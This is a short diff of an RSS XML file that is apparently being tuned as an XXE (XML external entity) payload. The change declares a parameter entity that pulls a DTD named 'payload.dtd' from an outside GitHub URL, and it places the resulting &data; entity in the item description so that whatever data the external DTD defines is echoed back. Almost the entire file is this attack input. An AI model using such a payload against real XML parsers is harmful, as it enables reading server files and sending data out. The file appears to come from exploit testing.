@@ -1,21 +1,20 @@
 <?xml version="1.0"?>
 <!DOCTYPE rss [
   <!ELEMENT rss ANY>
-  <!ENTITY dtd SYSTEM "https://raw.githubusercontent.com/chrislam82/XML_test_82/master/payload.dtd">
+  <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/chrislam82/XML_test_82/master/payload.dtd">
   %dtd;
 ]>
 <rss>
     <channel>
         <item>
             <title>
-               &data;
                title
             </title>
             <link>
                 hello
             </link>
             <description>
-                lol
+                &data;
             </description>
             <pubDate>
                 pubdate
